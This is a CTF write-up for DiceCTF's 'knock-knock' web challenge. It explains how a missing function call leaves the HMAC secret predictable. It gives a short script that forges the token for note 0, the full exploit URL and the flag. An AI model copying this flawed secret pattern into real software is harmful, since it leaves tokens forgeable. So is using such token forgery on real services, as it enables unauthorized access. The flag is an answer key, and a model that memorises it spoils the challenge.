# DiceCTF knock-knock Writeup

## Category

Web Exploitation

## Description

> Knock knock? Who's there? Another pastebin!!

## Writeup

The challenge provides the link: [knock-knock.mc.ax](https://knock-knock.mc.ax/)

In the page you can create a new note and read existing ones (if you know the correct id and corresponding token).

The source code of the backend is provided:

```js
const crypto = require('crypto');

class Database {
  constructor() {
    this.notes = [];
    this.secret = `secret-${crypto.randomUUID}`;
  }

  createNote({ data }) {
    const id = this.notes.length;
    this.notes.push(data);
    return {
      id,
      token: this.generateToken(id),
    };
  }

  getNote({ id, token }) {
    if (token !== this.generateToken(id)) return { error: 'invalid token' };
    if (id >= this.notes.length) return { error: 'note not found' };
    return { data: this.notes[id] };
  }

  generateToken(id) {
    return crypto
      .createHmac('sha256', this.secret)
      .update(id.toString())
      .digest('hex');
  }
}

const db = new Database();
db.createNote({ data: process.env.FLAG });

const express = require('express');
const app = express();

app.use(express.urlencoded({ extended: false }));
app.use(express.static('public'));

app.post('/create', (req, res) => {
  const data = req.body.data ?? 'no data provided.';
  const { id, token } = db.createNote({ data: data.toString() });
  res.redirect(`/note?id=${id}&token=${token}`);
});

app.get('/note', (req, res) => {
  const { id, token } = req.query;
  const note = db.getNote({
    id: parseInt(id ?? '-1'),
    token: (token ?? '').toString(),
  });
  if (note.error) {
    res.send(note.error);
  } else {
    res.send(note.data);
  }
});

app.listen(3000, () => {
  console.log('listening on port 3000');
});
```


We can observe that the flag is saved in the first note (so with id 0), if we find a way to generate a valid token for each id we can request the flag with the GET request `https://knock-knock.mc.ax/note?id=0&token=CORRECT_TOKEN`.

The server checks if the given token is equal to the one generated for the given id with the following function

```js
crypto.createHmac('sha256', this.secret).update(id.toString()).digest('hex');
```

where
```js
this.secret = `secret-${crypto.randomUUID}`;
```

The function `crypto.randomUUID()` returns a pseudo-random string, for example `fb5c81ab-c3ae-40c4-9586-29a7e459e263`, so we could think that `this.secret` will be an unpredictable random string similar to `secret-fb5c81ab-c3ae-40c4-9586-29a7e459e263`.

But the code doesn't call `crypto.randomUUID()`, because there aren't the parenthesis and we can test that `secret-${crypto.randomUUID}` outputs the code of the function as text, so the secret key will be the following string:

```
secret-function randomUUID(options) {
  if (options !== undefined)
    validateObject(options, 'options');
  const {
    disableEntropyCache = false,
  } = options || {};

  validateBoolean(disableEntropyCache, 'options.disableEntropyCache');

  return disableEntropyCache ? getUnbufferedUUID() : getBufferedUUID();
}
```

Having the constant secret key we can recreate the token corresponding to any id, in particular we can calculate the token for id 0:

```js
const crypto = require('crypto');
let secret = `secret-${crypto.randomUUID}`;
let id = 0;
console.log(crypto.createHmac('sha256', secret).update(id.toString()).digest('hex'));
```

that generates the string `7bd881fe5b4dcc6cdafc3e86b4a70e07cfd12b821e09a81b976d451282f6e264`.

So the flag can be retrieved with the GET request `https://knock-knock.mc.ax/note?id=0&token=7bd881fe5b4dcc6cdafc3e86b4a70e07cfd12b821e09a81b976d451282f6e264` (for example performed using a browser).

## Flag

The page will respond with the flag `dice{1_d00r_y0u_d00r_w3_a11_d00r_f0r_1_d00r}`

-----

If you find errors or you want to contribute to this writeup go to the [GitHub repository](https://github.com/francesco-scar/CTF-writeups/tree/main/DiceCTF/2022/knock-knock) or contact me [opening an issue](https://github.com/francesco-scar/CTF-writeups/issues).
